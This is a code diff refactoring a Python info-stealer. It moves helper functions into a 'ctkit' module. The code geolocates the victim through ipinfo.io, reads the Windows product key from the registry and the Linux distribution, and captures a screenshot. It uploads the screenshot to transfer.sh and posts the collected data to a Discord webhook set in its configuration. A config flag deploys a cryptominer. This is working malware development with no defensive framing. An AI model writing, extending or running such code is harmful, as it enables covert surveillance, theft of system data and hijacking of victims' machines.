@@ -50,10 +50,6 @@ pcname = os.path.expanduser("~")
 data_link = f"https://ipinfo.io/{IPAddr.text[:-2]}/json"
 respons = urlopen(data_link)
 data = json.load(respons)
-def upload_to_transfer_sh(file_path):
-    with open(file_path, 'rb') as file:
-        response = requests.put('https://transfer.sh/' + file_path, data=file)
-        return response.text.strip()
 def extract_files(file_names,destination_dir):
     # Determine the path to the directory containing the executable
     if getattr(sys, 'frozen', False):  # If running as a bundled executable
@@ -72,46 +68,6 @@ def extract_files(file_names,destination_dir):
             shutil.copy(source_path, destination_path)
         except Exception as e:
             sys.exit(f"ERROR: {e}")
-def get_windows_product_key():
-    try:
-        import winreg
-        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-        value_name = "DigitalProductId"
-
-        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
-            product_key_bytes = winreg.QueryValueEx(key, value_name)[0]
-        
-        product_key = ""
-        for b in product_key_bytes[52:67]:
-            product_key += "%02x" % b
-            return product_key
-    except:
-        return platform.system()
-def get_linux_distro():
-    try:
-        with open('/etc/os-release', 'r') as f:
-            lines = f.readlines()
-            distro_name = ""
-            distro_id = ""
-
-            for line in lines:
-                if line.startswith('PRETTY_NAME='):
-                    distro_name = line.split('=')[1].strip().strip('"')
-                elif line.startswith('ID='):
-                    distro_id = line.split('=')[1].strip().strip('"')
-                    break  # Stop reading after finding the ID field
-
-            if distro_id == "arch":
-                return f"{distro_name} (Based on Arch)"
-            elif distro_id == "debian":
-                return f"{distro_name} (Based on Debian)"
-            else:
-                return f"{distro_name} (Custom or Unknown: {distro_id})"
-    except FileNotFoundError:
-        pass
-    
-    return "Unknown"
-
 # Miner deploy
 if config["MINER"] == True:
     if platform.system() == "Windows":
@@ -143,16 +99,16 @@ Location ------- >> {data["loc"]}
 Postal --------- >> {data["postal"]}
 
 -----WINDOWS ONLY----
-Key ------------ >> {get_windows_product_key()}
+Key ------------ >> {ctkit.OSspecific.Windows.get_windows_product_key()}
 
 ------LINUX ONLY-----
-Distribution: {get_linux_distro()}
+Distribution: {ctkit.OSspecific.Linux.get_linux_distro()}
 
 '''
 
 screenshot = ImageGrab.grab()
 screenshot.save("screenshot.png")
-screenshot_url = upload_to_transfer_sh("screenshot.png")
+screenshot_url = ctkit.upload_to_transfer_sh("screenshot.png")
 def main():
     webhook = discord_webhook.DiscordWebhook(url=str(config["WEBHOOK"]),rate_limit_retry= True)
     embed = discord_webhook.DiscordEmbed(title="ISOLATION",description=embedcont, color="23272A")
